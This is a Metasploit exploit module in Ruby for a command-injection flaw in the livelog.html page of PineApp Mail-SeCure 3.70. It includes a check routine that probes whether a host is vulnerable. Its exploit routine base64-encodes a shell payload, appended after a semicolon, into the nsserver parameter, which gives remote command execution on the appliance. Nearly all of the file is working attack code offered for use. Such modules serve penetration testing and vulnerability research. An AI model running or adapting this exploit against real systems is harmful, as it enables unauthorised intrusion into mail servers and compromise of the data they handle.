##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'PineApp Mail-SeCure livelog.html Arbitrary Command Execution',
      'Description'    => %q{
          This module exploits a command injection vulnerability on PineApp Mail-SeCure
        3.70. The vulnerability exists on the livelog.html component, due to the insecure
        usage of the shell_exec() php function. This module has been tested successfully
        on PineApp Mail-SeCure 3.70.
      },
      'Author'         =>
        [
          'Unknown',     # Vulnerability discovery
          'juan vazquez' # Metasploit module
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'ZDI', '13-184'],
          [ 'OSVDB', '95779']
        ],
      'Platform'       => ['unix'],
      'Arch'           => ARCH_CMD,
      'Privileged'     => false,
      'Payload'        =>
        {
          'Space'       => 1024,
          'DisableNops' => true,
          'Compat'      =>
            {
              'PayloadType' => 'cmd',
              'RequiredCmd' => 'generic perl python telnet'
            }
        },
      'Targets'        =>
        [
          [ 'PineApp Mail-SeCure 3.70', { }]
        ],
      'DefaultOptions' =>
        {
          'SSL' => true
        },
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Jul 26 2013'
      ))

    register_options(
      [
        Opt::RPORT(7443)
      ],
      self.class
    )

  end

  def my_uri
    return normalize_uri("/livelog.html")
  end

  def check
    res = send_request_cgi({
      'uri' => my_uri,
      'vars_get' => {
        'cmd' =>'nslookup',
        'nstype' => Rex::Text.encode_base64("A"),
        'hostip' => Rex::Text.encode_base64("127.0.0.1"), # Using 127.0.0.1 in order to accelerate things with the legit command
        'nsserver' => Rex::Text.encode_base64("127.0.0.1")
      }
    })
    if res and res.code == 200 and res.body =~ /NS Query result for 127\.0\.0\.1/
      return Exploit::CheckCode::Appears
    end
    return Exploit::CheckCode::Safe
  end

  def exploit
    print_status("#{rhost}:#{rport} - Executing payload...")
    send_request_cgi({
      'uri' => my_uri,
      'vars_get' => {
        'cmd' =>'nslookup',
        'nstype' => Rex::Text.encode_base64("A"),
        'hostip' => Rex::Text.encode_base64("127.0.0.1"), # Using 127.0.0.1 in order to accelerate things with the legit command
        'nsserver' => Rex::Text.encode_base64("127.0.0.1;#{payload.encoded}")
      }
    })
  end

end